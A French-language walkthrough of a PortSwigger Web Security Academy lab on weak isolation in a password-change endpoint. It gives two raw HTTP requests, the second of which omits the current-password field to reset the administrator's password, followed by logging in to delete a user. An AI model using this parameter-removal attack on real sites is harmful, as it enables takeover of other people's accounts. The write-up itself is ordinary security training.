# Lab

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

## Solution

Sur la page de profil de l'utilisateur, on peut modifier son mot de passe en renseignant, son username, son mot de passe actuel et le nouveau mot de passe.

```html
POST /my-account/change-password HTTP/2
Host: 0aa5008a0495781981d344b000d300cd.web-security-academy.net
Cookie: session=7ckvn6V4Uhxj4rH835UgJc6uD0Hs8PWW
Content-Length: 115
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa5008a0495781981d344b000d300cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa5008a0495781981d344b000d300cd.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

csrf=tcmiifiWfRVteOWzcAaC1JgG9JoeFMUq&username=wiener&current-password=zaza&new-password-1=zaza&new-password-2=zaza
```

Si on supprime le paramètre `current-password`, on peut changer le mot de passe de n'importe quel utilisateur.

```html
POST /my-account/change-password HTTP/2
Host: 0aa5008a0495781981d344b000d300cd.web-security-academy.net
Cookie: session=7ckvn6V4Uhxj4rH835UgJc6uD0Hs8PWW
Content-Length: 100
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa5008a0495781981d344b000d300cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa5008a0495781981d344b000d300cd.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

csrf=tcmiifiWfRVteOWzcAaC1JgG9JoeFMUq&username=administrator&new-password-1=zaza&new-password-2=zaza
```

On peut ensuite se connecter avec le compte `administrator` et le mot de passe `zaza` pour supprimer l'utilisateur `carlos`.